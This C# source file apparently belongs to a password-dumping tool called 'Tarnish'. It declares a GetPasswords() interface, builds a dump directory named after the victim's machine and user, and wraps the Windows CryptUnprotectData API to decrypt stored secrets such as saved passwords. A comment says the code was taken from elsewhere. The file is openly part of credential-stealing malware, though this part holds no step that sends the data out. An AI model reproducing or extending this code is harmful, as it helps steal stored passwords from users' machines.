﻿using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Reflection;

namespace Tarnish
{
    // Nested Types
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct DATA_BLOB
    {
        public int cbData;
        public IntPtr pbData;
    }
    interface Proc
    {
        string GetPasswords();
        string Name { get; }
    }
    public static class Global
    {
        [DllImport("crypt32", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern bool CryptProtectData(ref DATA_BLOB dataIn, string szDataDescr, IntPtr optionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);
        [DllImport("crypt32", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern bool CryptUnprotectData(ref DATA_BLOB dataIn, StringBuilder ppszDataDescr, IntPtr optionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);
        [DllImport("kernel32.dll")]
        internal static extern IntPtr LocalFree(IntPtr hMem);

        public static AssemblyName AssemName = Assembly.GetExecutingAssembly().GetName();
        public static string DumpDir = Environment.CurrentDirectory + @"\Dump\" + Environment.MachineName + "." + Environment.UserName + @"\";

        // I stole this code from somewhere. It was open source. It's all cool.
        public static byte[] UnprotectData(byte[] data, int dwFlags)
        {
            DATA_BLOB data_blob1;
            DATA_BLOB data_blob2;
            byte[] buffer1 = null;
            data_blob1 = new DATA_BLOB();
            data_blob1.cbData = data.Length;
            data_blob1.pbData = Marshal.AllocHGlobal(data_blob1.cbData);
            Marshal.Copy(data, 0, data_blob1.pbData, data_blob1.cbData);
            data_blob2 = new DATA_BLOB();
            try
            {
                if (CryptUnprotectData(ref data_blob1, null, IntPtr.Zero,
                IntPtr.Zero, IntPtr.Zero, dwFlags, ref data_blob2))
                {
                    buffer1 = new byte[data_blob2.cbData];
                    Marshal.Copy(data_blob2.pbData, buffer1, 0, data_blob2.cbData);
                    byte[] buffer2 = new byte[data_blob2.cbData];
                    Marshal.Copy(data_blob2.pbData, buffer2, 0, data_blob2.cbData);
                    LocalFree(data_blob2.pbData);
                    data_blob2.pbData = IntPtr.Zero;
                    return buffer1;
                }
                int num1 = Marshal.GetLastWin32Error();
                string text1 = string.Format("CryptUnprotectData: Win32 error:{0}", num1);
                throw new Exception(text1);
            }
            finally
            {
                if (data_blob1.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(data_blob1.pbData);
                while (data_blob2.pbData != IntPtr.Zero)
                {
                    LocalFree(data_blob2.pbData);
                    data_blob2.pbData = IntPtr.Zero;
                    break;
                }
            }
            return buffer1;
        }
    }
}
